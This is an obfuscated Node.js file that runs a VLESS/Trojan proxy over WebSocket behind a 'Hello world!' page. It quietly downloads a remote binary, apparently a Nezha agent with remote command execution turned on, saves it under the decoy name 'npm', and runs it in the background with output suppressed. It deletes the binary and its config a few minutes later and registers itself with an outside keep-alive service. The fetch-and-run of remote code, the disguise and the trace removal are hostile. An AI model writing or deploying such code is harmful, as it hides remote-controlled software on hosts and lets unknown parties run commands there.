const _0x571db7=_0x1660;(function(_0x2180aa,_0xcb048){const _0x20b50f=_0x1660,_0x18870d=_0x2180aa();while(!![]){try{const _0x312cca=parseInt(_0x20b50f(0x149))/0x1+parseInt(_0x20b50f(0x13a))/0x2*(parseInt(_0x20b50f(0x125))/0x3)+-parseInt(_0x20b50f(0x12c))/0x4*(parseInt(_0x20b50f(0x126))/0x5)+parseInt(_0x20b50f(0x132))/0x6+parseInt(_0x20b50f(0x11e))/0x7+-parseInt(_0x20b50f(0x142))/0x8*(parseInt(_0x20b50f(0x116))/0x9)+-parseInt(_0x20b50f(0x101))/0xa;if(_0x312cca===_0xcb048)break;else _0x18870d['push'](_0x18870d['shift']());}catch(_0x1a914d){_0x18870d['push'](_0x18870d['shift']());}}}(_0x5cd8,0x5498b));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x571db7(0x12a)),net=require(_0x571db7(0xd7)),path=require(_0x571db7(0x13f)),crypto=require(_0x571db7(0xf8)),{Buffer}=require(_0x571db7(0xdb)),{exec,execSync}=require(_0x571db7(0x133)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x571db7(0xf3)][_0x571db7(0x114)]||_0x571db7(0x124),NEZHA_SERVER=process[_0x571db7(0xf3)][_0x571db7(0x14b)]||'',NEZHA_PORT=process[_0x571db7(0xf3)][_0x571db7(0x150)]||'',NEZHA_KEY=process['env'][_0x571db7(0x131)]||'',DOMAIN=process[_0x571db7(0xf3)][_0x571db7(0x148)]||_0x571db7(0x10c),AUTO_ACCESS=process['env'][_0x571db7(0x147)]||![],WSPATH=process[_0x571db7(0xf3)][_0x571db7(0x110)]||UUID[_0x571db7(0x14a)](0x0,0x8),SUB_PATH=process[_0x571db7(0xf3)][_0x571db7(0xfc)]||_0x571db7(0x118),NAME=process[_0x571db7(0xf3)]['NAME']||'',PORT=process[_0x571db7(0xf3)]['PORT']||0xbb8;let ISP='';const GetISP=async()=>{const _0x553bfb=_0x571db7;try{const _0x588f0f=await axios[_0x553bfb(0x105)](_0x553bfb(0x130)),_0x590db3=_0x588f0f[_0x553bfb(0x127)];ISP=(_0x590db3['country']+'-'+_0x590db3[_0x553bfb(0xde)])[_0x553bfb(0x128)](/ /g,'_');}catch(_0x213dec){ISP=_0x553bfb(0x106);}};GetISP();const httpServer=http['createServer']((_0x9525f0,_0x26349d)=>{const _0x5c8946=_0x571db7;if(_0x9525f0[_0x5c8946(0x11b)]==='/'){const _0x112cbd=path[_0x5c8946(0x13e)](__dirname,_0x5c8946(0xf6));fs[_0x5c8946(0x11f)](_0x112cbd,_0x5c8946(0x129),(_0x5ee83a,_0x552f5b)=>{const _0x329d26=_0x5c8946;if(_0x5ee83a){_0x26349d[_0x329d26(0x10a)](0xc8,{'Content-Type':_0x329d26(0xec)}),_0x26349d['end'](_0x329d26(0x103));return;}_0x26349d[_0x329d26(0x10a)](0xc8,{'Content-Type':_0x329d26(0xec)}),_0x26349d[_0x329d26(0x117)](_0x552f5b);});return;}else{if(_0x9525f0[_0x5c8946(0x11b)]==='/'+SUB_PATH){const _0x24b97d=NAME?NAME+'-'+ISP:ISP,_0x37da26=_0x5c8946(0xf9)+UUID+_0x5c8946(0x144)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x24b97d,_0x5e71b7=_0x5c8946(0x100)+UUID+'@cdns.doon.eu.org:443?security=tls&sni='+DOMAIN+_0x5c8946(0x139)+DOMAIN+_0x5c8946(0x141)+WSPATH+'#'+_0x24b97d,_0x1b6db3=_0x37da26+'\x0a'+_0x5e71b7,_0x177ac=Buffer[_0x5c8946(0xdd)](_0x1b6db3)[_0x5c8946(0x120)]('base64');_0x26349d[_0x5c8946(0x10a)](0xc8,{'Content-Type':'text/plain'}),_0x26349d[_0x5c8946(0x117)](_0x177ac+'\x0a');}else _0x26349d[_0x5c8946(0x10a)](0x194,{'Content-Type':_0x5c8946(0x13c)}),_0x26349d[_0x5c8946(0x117)](_0x5c8946(0x111));}}),wss=new WebSocket[(_0x571db7(0xee))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x571db7(0xe7),_0x571db7(0x12e)];function resolveHost(_0x5ddf76){return new Promise((_0x35b03c,_0x6bf176)=>{const _0x126ae0=_0x1660;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x126ae0(0xe2)](_0x5ddf76)){_0x35b03c(_0x5ddf76);return;}let _0x309b4a=0x0;function _0x1ffae5(){const _0x9b98e0=_0x126ae0;if(_0x309b4a>=DNS_SERVERS[_0x9b98e0(0x134)]){_0x6bf176(new Error(_0x9b98e0(0xf2)+_0x5ddf76+_0x9b98e0(0x14d)));return;}const _0x1ba635=DNS_SERVERS[_0x309b4a];_0x309b4a++;const _0x47bdd9=_0x9b98e0(0xd4)+encodeURIComponent(_0x5ddf76)+_0x9b98e0(0x14f);axios[_0x9b98e0(0x105)](_0x47bdd9,{'timeout':0x1388,'headers':{'Accept':_0x9b98e0(0x137)}})[_0x9b98e0(0xe8)](_0x189488=>{const _0x238963=_0x9b98e0,_0x28868e=_0x189488[_0x238963(0x127)];if(_0x28868e[_0x238963(0x10f)]===0x0&&_0x28868e['Answer']&&_0x28868e['Answer'][_0x238963(0x134)]>0x0){const _0x401480=_0x28868e[_0x238963(0xea)][_0x238963(0xf1)](_0x35497a=>_0x35497a[_0x238963(0x10d)]===0x1);if(_0x401480){_0x35b03c(_0x401480[_0x238963(0x127)]);return;}}_0x1ffae5();})[_0x9b98e0(0x136)](_0x4bdc41=>{_0x1ffae5();});}_0x1ffae5();});}function handleVlessConnection(_0x9e0360,_0x2b990a){const _0x4cde3f=_0x571db7,[_0x5d4673]=_0x2b990a,_0x260974=_0x2b990a['slice'](0x1,0x11);if(!_0x260974['every']((_0x3f7373,_0x41a06e)=>_0x3f7373==parseInt(uuid[_0x4cde3f(0xfb)](_0x41a06e*0x2,0x2),0x10)))return![];let _0x24d9f1=_0x2b990a['slice'](0x11,0x12)[_0x4cde3f(0x10e)]()+0x13;const _0x40eed8=_0x2b990a[_0x4cde3f(0x14a)](_0x24d9f1,_0x24d9f1+=0x2)['readUInt16BE'](0x0),_0x563e53=_0x2b990a[_0x4cde3f(0x14a)](_0x24d9f1,_0x24d9f1+=0x1)[_0x4cde3f(0x10e)](),_0x59ce75=_0x563e53==0x1?_0x2b990a[_0x4cde3f(0x14a)](_0x24d9f1,_0x24d9f1+=0x4)[_0x4cde3f(0x13e)]('.'):_0x563e53==0x2?new TextDecoder()[_0x4cde3f(0x154)](_0x2b990a[_0x4cde3f(0x14a)](_0x24d9f1+0x1,_0x24d9f1+=0x1+_0x2b990a[_0x4cde3f(0x14a)](_0x24d9f1,_0x24d9f1+0x1)['readUInt8']())):_0x563e53==0x3?_0x2b990a[_0x4cde3f(0x14a)](_0x24d9f1,_0x24d9f1+=0x10)[_0x4cde3f(0xd6)]((_0xc44244,_0x2020e7,_0x330014,_0x3864f6)=>_0x330014%0x2?_0xc44244[_0x4cde3f(0x13d)](_0x3864f6[_0x4cde3f(0x14a)](_0x330014-0x1,_0x330014+0x1)):_0xc44244,[])['map'](_0x4b06f3=>_0x4b06f3['readUInt16BE'](0x0)[_0x4cde3f(0x120)](0x10))[_0x4cde3f(0x13e)](':'):'';_0x9e0360['send'](new Uint8Array([_0x5d4673,0x0]));const _0x204188=createWebSocketStream(_0x9e0360);return resolveHost(_0x59ce75)[_0x4cde3f(0xe8)](_0x49868f=>{const _0x3d8dac=_0x4cde3f;net['connect']({'host':_0x49868f,'port':_0x40eed8},function(){const _0x3b64ad=_0x1660;this[_0x3b64ad(0x113)](_0x2b990a[_0x3b64ad(0x14a)](_0x24d9f1)),_0x204188['on'](_0x3b64ad(0x115),()=>{})[_0x3b64ad(0xd9)](this)['on'](_0x3b64ad(0x115),()=>{})[_0x3b64ad(0xd9)](_0x204188);})['on'](_0x3d8dac(0x115),()=>{});})[_0x4cde3f(0x136)](_0x9058ca=>{const _0x425ec5=_0x4cde3f;net['connect']({'host':_0x59ce75,'port':_0x40eed8},function(){const _0x408762=_0x1660;this['write'](_0x2b990a[_0x408762(0x14a)](_0x24d9f1)),_0x204188['on'](_0x408762(0x115),()=>{})['pipe'](this)['on'](_0x408762(0x115),()=>{})[_0x408762(0xd9)](_0x204188);})['on'](_0x425ec5(0x115),()=>{});}),!![];}function handleTrojanConnection(_0x46a882,_0x2feb95){const _0x1f5775=_0x571db7;try{if(_0x2feb95[_0x1f5775(0x134)]<0x3a)return![];const _0xd48c08=_0x2feb95['slice'](0x0,0x38)[_0x1f5775(0x120)](),_0x7c4da3=[UUID];let _0x17923b=null;for(const _0xdb6053 of _0x7c4da3){const _0x39d016=crypto[_0x1f5775(0x109)](_0x1f5775(0x107))['update'](_0xdb6053)[_0x1f5775(0x146)](_0x1f5775(0xe5));if(_0x39d016===_0xd48c08){_0x17923b=_0xdb6053;break;}}if(!_0x17923b)return![];let _0x16a927=0x38;_0x2feb95[_0x16a927]===0xd&&_0x2feb95[_0x16a927+0x1]===0xa&&(_0x16a927+=0x2);const _0x26a772=_0x2feb95[_0x16a927];if(_0x26a772!==0x1)return![];_0x16a927+=0x1;const _0x13a820=_0x2feb95[_0x16a927];_0x16a927+=0x1;let _0x48a42e,_0x42cca8;if(_0x13a820===0x1)_0x48a42e=_0x2feb95[_0x1f5775(0x14a)](_0x16a927,_0x16a927+0x4)[_0x1f5775(0x13e)]('.'),_0x16a927+=0x4;else{if(_0x13a820===0x3){const _0x5baa30=_0x2feb95[_0x16a927];_0x16a927+=0x1,_0x48a42e=_0x2feb95[_0x1f5775(0x14a)](_0x16a927,_0x16a927+_0x5baa30)[_0x1f5775(0x120)](),_0x16a927+=_0x5baa30;}else{if(_0x13a820===0x4)_0x48a42e=_0x2feb95['slice'](_0x16a927,_0x16a927+0x10)[_0x1f5775(0xd6)]((_0x97cac4,_0x17538c,_0xd27e85,_0x1b4f79)=>_0xd27e85%0x2?_0x97cac4['concat'](_0x1b4f79[_0x1f5775(0x14a)](_0xd27e85-0x1,_0xd27e85+0x1)):_0x97cac4,[])[_0x1f5775(0xff)](_0x3e3189=>_0x3e3189['readUInt16BE'](0x0)[_0x1f5775(0x120)](0x10))[_0x1f5775(0x13e)](':'),_0x16a927+=0x10;else return![];}}_0x42cca8=_0x2feb95[_0x1f5775(0x143)](_0x16a927),_0x16a927+=0x2;_0x16a927<_0x2feb95[_0x1f5775(0x134)]&&_0x2feb95[_0x16a927]===0xd&&_0x2feb95[_0x16a927+0x1]===0xa&&(_0x16a927+=0x2);const _0x35c452=createWebSocketStream(_0x46a882);return resolveHost(_0x48a42e)[_0x1f5775(0xe8)](_0xc5e052=>{const _0x4e070b=_0x1f5775;net[_0x4e070b(0x104)]({'host':_0xc5e052,'port':_0x42cca8},function(){const _0x8ccfe2=_0x4e070b;_0x16a927<_0x2feb95[_0x8ccfe2(0x134)]&&this[_0x8ccfe2(0x113)](_0x2feb95[_0x8ccfe2(0x14a)](_0x16a927)),_0x35c452['on'](_0x8ccfe2(0x115),()=>{})[_0x8ccfe2(0xd9)](this)['on'](_0x8ccfe2(0x115),()=>{})[_0x8ccfe2(0xd9)](_0x35c452);})['on']('error',()=>{});})[_0x1f5775(0x136)](_0x47c1da=>{const _0xd571fc=_0x1f5775;net[_0xd571fc(0x104)]({'host':_0x48a42e,'port':_0x42cca8},function(){const _0xc26625=_0xd571fc;_0x16a927<_0x2feb95['length']&&this[_0xc26625(0x113)](_0x2feb95['slice'](_0x16a927)),_0x35c452['on'](_0xc26625(0x115),()=>{})['pipe'](this)['on'](_0xc26625(0x115),()=>{})[_0xc26625(0xd9)](_0x35c452);})['on'](_0xd571fc(0x115),()=>{});}),!![];}catch(_0x446eda){return![];}}wss['on'](_0x571db7(0x13b),(_0x56e1fb,_0x36b4a1)=>{const _0x5017ed=_0x571db7,_0x51f9cf=_0x36b4a1[_0x5017ed(0x11b)]||'';_0x56e1fb['once'](_0x5017ed(0x11a),_0x1dd761=>{const _0x15c472=_0x5017ed;if(_0x1dd761[_0x15c472(0x134)]>0x11&&_0x1dd761[0x0]===0x0){const _0x48c469=_0x1dd761[_0x15c472(0x14a)](0x1,0x11),_0x18f998=_0x48c469[_0x15c472(0xed)]((_0x2a699f,_0x2c1097)=>_0x2a699f==parseInt(uuid['substr'](_0x2c1097*0x2,0x2),0x10));if(_0x18f998){!handleVlessConnection(_0x56e1fb,_0x1dd761)&&_0x56e1fb[_0x15c472(0xef)]();return;}}!handleTrojanConnection(_0x56e1fb,_0x1dd761)&&_0x56e1fb[_0x15c472(0xef)]();})['on']('error',()=>{});});function _0x1660(_0xaf395f,_0x5801ec){_0xaf395f=_0xaf395f-0xd4;const _0x5cd8d2=_0x5cd8();let _0x1660f0=_0x5cd8d2[_0xaf395f];return _0x1660f0;}const getDownloadUrl=()=>{const _0xfcf21a=_0x571db7,_0x14ff1f=os[_0xfcf21a(0x121)]();return _0x14ff1f===_0xfcf21a(0xf4)||_0x14ff1f===_0xfcf21a(0xe1)||_0x14ff1f===_0xfcf21a(0x14c)?!NEZHA_PORT?_0xfcf21a(0x155):_0xfcf21a(0xd5):!NEZHA_PORT?_0xfcf21a(0xe9):_0xfcf21a(0x108);},downloadFile=async()=>{const _0x1ff21d=_0x571db7;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x208eb8=getDownloadUrl(),_0x59960b=await axios({'method':_0x1ff21d(0x105),'url':_0x208eb8,'responseType':_0x1ff21d(0x11c)}),_0x3bbc13=fs[_0x1ff21d(0xeb)](_0x1ff21d(0x145));return _0x59960b[_0x1ff21d(0x127)][_0x1ff21d(0xd9)](_0x3bbc13),new Promise((_0xded768,_0x5ede61)=>{const _0x1be806=_0x1ff21d;_0x3bbc13['on'](_0x1be806(0xdc),()=>{const _0x3709cd=_0x1be806;console[_0x3709cd(0x12f)](_0x3709cd(0x138)),exec(_0x3709cd(0xda),_0x4c8e87=>{if(_0x4c8e87)_0x5ede61(_0x4c8e87);_0xded768();});}),_0x3bbc13['on'](_0x1be806(0x115),_0x5ede61);});}catch(_0xf0c549){throw _0xf0c549;}},runnz=async()=>{const _0x1b4228=_0x571db7;try{const _0x5608de=execSync(_0x1b4228(0x135),{'encoding':_0x1b4228(0x14e)});if(_0x5608de['trim']()!==''){console[_0x1b4228(0x12f)](_0x1b4228(0x122));return;}}catch(_0x126329){}await downloadFile();let _0x5c709c='',_0xc60f78=[_0x1b4228(0x102),_0x1b4228(0xe0),'2096','2087','2083',_0x1b4228(0x10b)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x44b27f=_0xc60f78[_0x1b4228(0xfe)](NEZHA_PORT)?'--tls':'';_0x5c709c=_0x1b4228(0xdf)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1b4228(0xf7)+NEZHA_KEY+'\x20'+_0x44b27f+_0x1b4228(0x12d);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2c1c25=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x1b4228(0xd8)]():'',_0x2be7ca=_0xc60f78[_0x1b4228(0xfe)](_0x2c1c25)?'true':'false',_0x25803c=_0x1b4228(0x140)+NEZHA_KEY+_0x1b4228(0xe6)+NEZHA_SERVER+_0x1b4228(0xf0)+_0x2be7ca+_0x1b4228(0x12b)+UUID;fs[_0x1b4228(0x119)](_0x1b4228(0xe3),_0x25803c);}_0x5c709c=_0x1b4228(0x11d);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x5c709c,{'shell':'/bin/bash'},_0x4f33b9=>{const _0x9c7386=_0x1b4228;if(_0x4f33b9)console[_0x9c7386(0x115)](_0x9c7386(0x112),_0x4f33b9);else console[_0x9c7386(0x12f)]('npm\x20is\x20running');});}catch(_0x3b38b8){console['error'](_0x1b4228(0x123)+_0x3b38b8);}};async function addAccessTask(){const _0x1626d7=_0x571db7;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xf9c1b3=_0x1626d7(0x152)+DOMAIN+'/'+SUB_PATH;try{const _0x22f34b=await axios[_0x1626d7(0xfd)]('https://oooo.serv00.net/add-url',{'url':_0xf9c1b3},{'headers':{'Content-Type':_0x1626d7(0x151)}});console['log'](_0x1626d7(0xf5));}catch(_0x2ae917){}}const delFiles=()=>{const _0x301e30=_0x571db7;fs[_0x301e30(0xfa)](_0x301e30(0x145),()=>{}),fs[_0x301e30(0xfa)]('config.yaml',()=>{});};httpServer[_0x571db7(0x153)](PORT,()=>{const _0x39ffda=_0x571db7;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x39ffda(0x12f)](_0x39ffda(0xe4)+PORT);});function _0x5cd8(){const _0x2a8c67=['774QKxkUG','end','pxy','writeFileSync','message','url','stream','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','832433hvcRRg','readFile','toString','arch','npm\x20is\x20already\x20running,\x20skip\x20running...','error:\x20','f5f7b337-a4a5-4623-a51c-b3f772e4ab14','87TYlcIH','431055NYvZyb','data','replace','utf8','axios','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','4WOTEng','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','1.1.1.1','log','https://speed.cloudflare.com/meta','NEZHA_KEY','2659062xRseFI','child_process','length','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','catch','application/dns-json','npm\x20download\x20successfully','&fp=chrome&type=ws&host=','20970sAEryh','connection','text/plain','concat','join','path','client_secret:\x20','&path=%2F','160fLrCkc','readUInt16BE','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','npm','digest','AUTO_ACCESS','DOMAIN','623292xunZBe','slice','NEZHA_SERVER','aarch64','\x20with\x20all\x20DNS\x20servers','utf-8','&type=A','NEZHA_PORT','application/json','https://','listen','decode','https://arm64.ssss.nyc.mn/v1','https://dns.google/resolve?name=','https://arm64.ssss.nyc.mn/agent','reduce','net','pop','pipe','chmod\x20+x\x20npm','buffer','finish','from','asOrganization','setsid\x20nohup\x20./npm\x20-s\x20','8443','arm64','test','config.yaml','Server\x20is\x20running\x20on\x20port\x20','hex','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','8.8.4.4','then','https://amd64.ssss.nyc.mn/v1','Answer','createWriteStream','text/html','every','Server','close','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','find','Failed\x20to\x20resolve\x20','env','arm','Automatic\x20Access\x20Task\x20added\x20successfully','index.html','\x20-p\x20','crypto','vless://','unlink','substr','SUB_PATH','post','includes','map','trojan://','10550150acdQiJ','443','Hello\x20world!','connect','get','Unknown','sha224','https://amd64.ssss.nyc.mn/agent','createHash','writeHead','2053','1234.abc.com','type','readUInt8','Status','WSPATH','Not\x20Found\x0a','npm\x20running\x20error:','write','UUID','error'];_0x5cd8=function(){return _0x2a8c67;};return _0x5cd8();}
